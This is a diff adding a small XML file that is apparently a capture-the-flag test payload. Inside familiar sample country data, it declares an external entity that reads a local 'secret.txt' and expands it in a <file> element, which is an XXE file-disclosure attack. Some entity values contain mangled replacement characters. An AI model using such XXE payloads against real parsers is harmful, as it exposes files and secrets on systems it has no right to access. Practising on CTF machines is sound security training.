@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY nbsp "�">
+  <!ENTITY copy "�">
+  <!ELEMENT rfile ANY >
+  <!ENTITY rfile SYSTEM "file:///E:/ctf/htb/RedPanda/code/secret.txt">
+]>
+<data>
+  <country name="Liechtenstein">
+    <rank>1&nbsp;�&gt;</rank>
+    <year>2008&copy;�</year>
+    <gdppc>141100</gdppc>
+    <neighbor name="Austria" direction="E" />
+    <neighbor name="Switzerland" direction="W" />
+    <file>&rfile;</file>
+  </country>
+</data>
